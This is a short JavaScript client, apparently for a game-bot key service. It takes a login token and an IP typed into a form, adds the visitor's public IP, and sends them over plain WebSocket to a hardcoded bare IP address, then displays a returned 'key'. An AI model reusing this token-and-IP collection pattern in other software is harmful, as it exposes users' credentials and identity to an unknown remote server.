var ws = {};
window.loadTime = null;
function pdata(data) {
    return new DataView(new ArrayBuffer(data));
}
window.start_send = function () {
    window.data = {};
    window.data.token = document.getElementById("login-token").value;
    window.data.keyNumb = document.getElementById("login-ip").value;
    connect();
};
function httpGet(theUrl) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", theUrl, false);
    xmlHttp.send(null);
    return xmlHttp.responseText;
}
function connect() {
    ws = new WebSocket("ws://194.87.95.4:8081");
    ws.binaryType = "arraybuffer";
    ws.onopen = function (arg) {
        ws.send(JSON.stringify({
            userip: httpGet("https://api.ipify.org/"),
            data: "setBots",
            reason: window.data
        }));
    }
    ws.onclose = function (arg) {
    }
    ws.onmessage = function (message) {
        var msg = JSON.parse(message.data);
        window.prompt("YOU GENERATE KEY:", msg.key_dat.key);
        if (msg.key_dat.key != undefined) {
            ws.close();
        }
    }
}